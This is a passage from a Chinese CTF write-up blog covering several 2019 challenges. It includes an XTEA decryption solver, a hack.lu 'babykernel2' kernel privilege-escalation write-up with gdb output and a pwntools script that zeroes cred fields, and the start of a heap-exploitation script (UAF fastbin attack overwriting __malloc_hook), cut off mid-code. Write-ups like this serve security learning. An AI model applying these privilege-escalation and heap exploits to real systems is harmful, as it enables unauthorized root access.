class="title">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[]=&#123;</span><br><span class="line">        <span class="number">0x4e</span>,<span class="number">0x6e</span>,<span class="number">0xc7</span>,<span class="number">0xea</span>,</span><br><span class="line">        <span class="number">0x8a</span>,<span class="number">0x9d</span>,<span class="number">0x70</span>,<span class="number">0x89</span>,<span class="comment">//第1次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xeb</span>,<span class="number">0xe2</span>,<span class="number">0x45</span>,<span class="number">0xd3</span>,</span><br><span class="line">        <span class="number">0xb8</span>,<span class="number">0x4a</span>,<span class="number">0xc0</span>,<span class="number">0x73</span>,<span class="comment">//第2次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xb0</span>,<span class="number">0x4a</span>,<span class="number">0x40</span>,<span class="number">0x71</span>,</span><br><span class="line">        <span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x88</span>,<span class="number">0x42</span>,<span class="comment">//第3次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0x32</span>,<span class="number">0x88</span>,<span class="number">0x80</span>,<span class="number">0xd0</span>,</span><br><span class="line">        <span class="number">0x89</span>,<span class="number">0xdb</span>,<span class="number">0xa1</span>,<span class="number">0x1e</span>,<span class="comment">//第4次xtea</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0x35</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x31</span>,</span><br><span class="line">        <span class="number">0x33</span>,<span class="number">0x7d</span><span class="comment">//没有加密</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        <span class="built_in">decipher</span>(<span class="number">32</span>,(<span class="type">unsigned</span> <span class="type">int</span>*)(data+i*<span class="number">8</span>),key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;38fd643cc2c5200cc769b31ae7e58913&#125;</span></span><br></pre></td></tr></table></figure>

<p>运行发现直接跑出来flag了：</p>
<style>.ytokilfkdhpg{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-22.png" class="ytokilfkdhpg" alt="img">

<style>.cijpvpgfmcpf{zoom: 50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-23.png" class="cijpvpgfmcpf" alt="img">

<style>.bdnenmsfdcnl{zoom:50%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-24.png" class="bdnenmsfdcnl" alt="img">

<p>并且验证成功</p>
<p>那就不需要再继续分析f54了，证明该函数和flag验证流程没关系</p>
<h1 id="2019-re-BoringCrypto"><a href="#2019-re-BoringCrypto" class="headerlink" title="2019 re BoringCrypto"></a>2019 re BoringCrypto</h1><p>安卓native类型逆向，首先分析java中main函数，可知check函数使用的是jni的静态注册方法，因此应该比较容易找到，那么就找到native.so然后用ida打开：</p>
<style>.wqxrnfnffvqc{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-25.png" class="wqxrnfnffvqc" alt="img">

<style>.imjjrsrqiltb{zoom:67%;}</style><img src="/2019/11/22/qwb2019-re/1763433999325-26.png" class="imjjrsrqiltb" alt="img">

<p>这个函数反汇编之后都有将近5000行，太复杂，看不太懂qaq</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/22/qwb2019-re/" data-id="cuid5Qx_8civHNxywAYbGQ9N5" data-title="qwb2019-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2019hacklu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/09/2019hacklu/" class="article-date">
  <time class="dt-published" datetime="2019-11-09T03:07:10.000Z" itemprop="datePublished">2019-11-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/09/2019hacklu/">hack.lu 2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="babykernel2"><a href="#babykernel2" class="headerlink" title="babykernel2"></a>babykernel2</h2><p>直接给了AAW和AAR</p>
<p>Each process has a struct called task_struct which is stored in kernel space, this structure contains a lot of information related to the process like scheduling information, memory descriptor(mm_struct) which has information about programs memory, parent process, linked list of child process, next task and more importantly it has a pointer to process privileges which is a structure named cred. So our task is to overwrite the identifiers( uid, gid, group id, fsuid, fsgid) to 0 which is nothing but a process with root privileges.</p>
<ol>
<li>Read <code>current_task</code> ptr address based on provided <code>System.map</code></li>
<li>Get <code>cred* cred</code> pointer</li>
<li>Overwrite <code>cred-&gt;fsuid</code> and <code>cred-&gt;fsguid</code></li>
<li>Read <code>/flag</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> ptype /o struct cred</span><br><span class="line">/* offset    |  size */  <span class="built_in">type</span> = struct cred &#123;</span><br><span class="line">/*    0      |     4 */    atomic_t usage;</span><br><span class="line">/*    4      |     4 */    kuid_t uid;</span><br><span class="line">/*    8      |     4 */    kgid_t gid;</span><br><span class="line">/*   12      |     4 */    kuid_t suid;</span><br><span class="line">/*   16      |     4 */    kgid_t sgid;</span><br><span class="line">/*   20      |     4 */    kuid_t euid;</span><br><span class="line">/*   24      |     4 */    kgid_t egid;</span><br><span class="line">/*   28      |     4 */    kuid_t fsuid;</span><br><span class="line">/*   32      |     4 */    kgid_t fsgid;</span><br><span class="line">/*   36      |     4 */    unsigned int securebits;</span><br><span class="line">/*   40      |     8 */    kernel_cap_t cap_inheritable;</span><br><span class="line">/*   48      |     8 */    kernel_cap_t cap_permitted;</span><br><span class="line">/*   56      |     8 */    kernel_cap_t cap_effective;</span><br><span class="line">/*   64      |     8 */    kernel_cap_t cap_bset;</span><br><span class="line">/*   72      |     8 */    kernel_cap_t cap_ambient;</span><br><span class="line">/*   80      |     8 */    struct user_struct *user;</span><br><span class="line">/*   88      |     8 */    struct user_namespace *user_ns;</span><br><span class="line">/*   96      |     8 */    struct group_info *group_info;</span><br><span class="line">/*  104      |    16 */    union &#123;</span><br><span class="line">/*                 4 */        int non_rcu;</span><br><span class="line">/*                16 */        struct callback_head &#123;</span><br><span class="line">/*  104      |     8 */            struct callback_head *next;</span><br><span class="line">/*  112      |     8 */            void (*func)(struct callback_head *);</span><br><span class="line"></span><br><span class="line">                                   /* total size (bytes):   16 */</span><br><span class="line">                               &#125; rcu;</span><br><span class="line"></span><br><span class="line">                               /* total size (bytes):   16 */</span><br><span class="line">                           &#125;;</span><br><span class="line"></span><br><span class="line">                           /* total size (bytes):  120 */</span><br><span class="line">                         &#125;</span><br></pre></td></tr></table></figure>



<p>可以通过<code>init_task</code>也就是0号进程的前向task_list指针找到<code>current_task</code>，可以通过泄露<code>comm</code>进程名来确定</p>
<p>因为通过Ctrl+C在gdb中断下的是在Init的swapper，即0号进程，通过tasks指针来找到最后一个运行的进程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p current_task.tasks</span><br><span class="line"><span class="variable">$18</span> = &#123;</span><br><span class="line">  next = 0xffff888000028210,</span><br><span class="line">  prev = 0xffff888003375990</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然应该最简单的是通过<code>current_task</code>来，在运行的client_kernel.ko中下断，此时内核的current_task即为当前进程并查看cred如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p current_task</span><br><span class="line">$<span class="number">32</span> = (<span class="keyword">struct</span> task_struct *) <span class="number">0xffff888003373480</span></span><br><span class="line">gef&gt; p $<span class="number">32.</span>comm</span><br><span class="line">$<span class="number">33</span> =   <span class="string">&quot;client_kernel_b&quot;</span></span><br><span class="line">gef&gt; p $<span class="number">32.</span>cred</span><br><span class="line">$<span class="number">34</span> = (<span class="type">const</span> <span class="keyword">struct</span> cred *) <span class="number">0xffff888003384700</span></span><br><span class="line">gef&gt; p *$<span class="number">34</span></span><br><span class="line">$<span class="number">35</span> = &#123;</span><br><span class="line">  usage = &#123;</span><br><span class="line">    counter = <span class="number">0x3</span></span><br><span class="line">  &#125;,</span><br><span class="line">  uid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  gid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  suid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  sgid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  euid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  egid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  fsuid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  fsgid = &#123;</span><br><span class="line">    val = <span class="number">0x3e8</span></span><br><span class="line">  &#125;,</span><br><span class="line">  securebits = <span class="number">0x0</span>,</span><br><span class="line">  cap_inheritable = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">          [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_permitted = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_effective = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_bset = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0xffffffff</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x3f</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  cap_ambient = &#123;</span><br><span class="line">    cap =       &#123;[<span class="number">0x0</span>] = <span class="number">0x0</span>,</span><br><span class="line">      [<span class="number">0x1</span>] = <span class="number">0x0</span>&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  user = <span class="number">0xffff888003380000</span>,</span><br><span class="line">  user_ns = <span class="number">0xffffffff8183e5c0</span> &lt;init_user_ns&gt;,</span><br><span class="line">  group_info = <span class="number">0xffff88800018d2c0</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    non_rcu = <span class="number">0x0</span>,</span><br><span class="line">    rcu = &#123;</span><br><span class="line">      next = <span class="number">0x0</span>,</span><br><span class="line">      func = <span class="number">0x0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见cred的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">gef&gt; ptype /o <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>    |  <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="comment">/*    0      |     4 */</span>    <span class="type">atomic_t</span> usage;</span><br><span class="line"><span class="comment">/*    4      |     4 */</span>    <span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="comment">/*    8      |     4 */</span>    <span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="comment">/*   12      |     4 */</span>    <span class="type">kuid_t</span> suid;</span><br><span class="line"><span class="comment">/*   16      |     4 */</span>    <span class="type">kgid_t</span> sgid;</span><br><span class="line"><span class="comment">/*   20      |     4 */</span>    <span class="type">kuid_t</span> euid;</span><br><span class="line"><span class="comment">/*   24      |     4 */</span>    <span class="type">kgid_t</span> egid;</span><br><span class="line"><span class="comment">/*   28      |     4 */</span>    <span class="type">kuid_t</span> fsuid;</span><br><span class="line"><span class="comment">/*   32      |     4 */</span>    <span class="type">kgid_t</span> fsgid;</span><br></pre></td></tr></table></figure>

<p>就根据offset从4byte-20bytes都更改为0，即可实现改进程的提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># HOST,PORT = &quot;babykernel2.forfuture.fluxfingers.net&quot;,&quot;1337&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(HOST,PORT,timeout=10)</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">addr</span>):</span><br><span class="line">    sl(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">    r(<span class="string">&quot;level is: &quot;</span>)</span><br><span class="line">    value = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,value</span>):</span><br><span class="line">    sl(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(value))</span><br><span class="line"></span><br><span class="line">init_task = <span class="number">0xffffffff8181b4c0</span></span><br><span class="line">offset = <span class="number">0x218</span></span><br><span class="line"><span class="comment"># init_task.tasks.prev</span></span><br><span class="line">task = read(init_task+offset)-<span class="number">0x210</span></span><br><span class="line"><span class="comment"># task.cred</span></span><br><span class="line">cred = read(task+<span class="number">0x400</span>)</span><br><span class="line">write(cred,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x8</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x10</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x20</span>,<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="comment"># read flag</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;nicely_done_this_is_how_a_privesc_can_also_go&#125;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/09/2019hacklu/" data-id="cuidwkx8-nuOCF44hRSOvYhy_" data-title="hack.lu 2019" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2019巅峰极客线上赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2019-10-25T03:07:10.000Z" itemprop="datePublished">2019-10-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2019 巅峰极客 线上赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="snote"><a href="#snote" class="headerlink" title="snote"></a>snote</h2><p>泄露通过修改Topchunk的size，得到unsortedbin，进而得到libc</p>
<p>之后用UAF Fastbin attack，修改<code>__malloc_hook</code>为one_gadget即可Getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Date: 2019-10-19 11:02:57</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;55fca716.gamectf.com&quot;</span>,<span class="number">37009</span></span><br><span class="line">p = remote(HOST,PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop = <span class="literal">True</span>,timeout=<span class="number">1</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,cnt</span>):</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Size &gt; &quot;</span>,<span class="built_in">str</span>(size).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Content &gt; \n&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>():</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,cnt</span>):</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Size &gt; &quot;</span>,<span class="built_in">str</span>(size).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Content &gt; \n&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>():</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        finish</span></span><br><span class="line"><span class="string">        ni 9</span></span><br><span class="line"><span class="string">        b *$pc</span></span><br><span class="line"><span class="string">        b *__libc_malloc</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span 